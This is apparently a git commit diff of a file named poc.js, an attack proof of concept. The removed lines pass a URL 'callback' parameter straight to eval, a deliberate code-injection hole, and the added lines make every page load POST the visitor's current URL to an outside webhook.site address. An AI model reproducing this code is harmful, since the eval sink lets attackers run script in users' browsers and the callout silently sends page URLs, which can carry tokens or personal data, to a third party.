e63f18f3766302de404a7ea5d92cd60ad6edbbab
RE <turbine@UnknownHardware.localdomain>
2023-02-07 18:48:16 -0500

    Initial Commit

--- poc.js
+++ poc.js
@@ -1,7 +1,11 @@
-var query = window.location.search.substring(1);
-var params = new URLSearchParams(query);
-var callback = params.get("callback");
-
-if (callback) {
-  eval(decodeURIComponent(callback));
-}
+window.onload = function() {
+  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      url: window.location.href
+    })
+  });
+};
